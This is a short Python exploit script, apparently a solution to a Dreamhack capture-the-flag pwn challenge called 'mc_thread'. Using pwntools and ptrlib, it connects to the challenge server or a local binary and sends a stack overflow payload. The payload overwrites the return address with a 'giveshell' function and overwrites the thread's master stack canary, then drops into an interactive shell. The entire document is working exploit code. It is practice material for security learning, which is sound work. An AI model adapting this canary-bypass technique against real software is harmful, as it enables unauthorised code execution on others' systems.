#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./mc_thread_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 15729)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b""
    payload += b"A" * 0x118
    payload += ptr.p64(unwrap(exe.symbol("giveshell")))
    payload = payload.ljust(0x910, b"A")
    payload += ptr.p64(0x404800 - 0x972)
    payload = payload.ljust(0x928, b"A")
    payload += b"A" * 8  # master canary
    io.sendlineafter("Size: ", str(len(payload) // 8))
    io.sendlineafter("Data: ", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
